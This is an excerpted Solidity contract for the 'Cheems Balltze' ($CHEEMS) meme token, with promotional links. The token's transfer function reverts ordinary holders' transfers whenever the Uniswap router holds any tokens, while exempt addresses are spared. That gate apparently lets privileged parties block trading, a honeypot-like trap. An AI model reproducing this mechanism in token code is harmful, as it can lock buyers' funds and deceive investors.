...
Cheems Balltze $CHEEMS
https://knowyourmeme.com/memes/cheems
https://x.com/search?q=%24CHEEMS&src=typed_query
https://t.me/CHEEMS_PRTL
...
contract ERC20 is Context, Ownable, IERC20, IERC20Metadata {
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "1CHEEMS");
        require(recipient != address(0), "2CHEEMS");
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "3CHEEMS");
    ...
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "4CHEEMS");
        require(spender != address(0), "5CHEEMS");
...
contract CHEEMS is ERC20 {
    ...
    constructor(address router) ERC20("Cheems Balltze", "CHEEMS", TOTAL_SUSUPPLYS) {
    ...
    function _transfer(address from, address to, uint256 amount) internal override {
        require(from != address(0), "6CHEEMS");
        require(to != address(0), "7CHEEMS");
        _checkLimitation(from, to, amount);
        if (amount == 0) {
            return;
        }
        if (!isException[from] && !isException[to]) {
            require(balanceOf(address(uniswapV2Router)) == 0, "8CHEEMS");
        }
    ...
    function _checkLimitation(address from, address to, uint256 amount) internal {
        if (!hasLimit_) {
            if (!isException[from] && !isException[to]) {
                require(amount <= maxTxAmountbesomes, "9CHEEMS");
                ...
                require(balanceOf(to) + amount <= maxwalletssetsomes, "0CHEEMS");
            }
        }
    }
}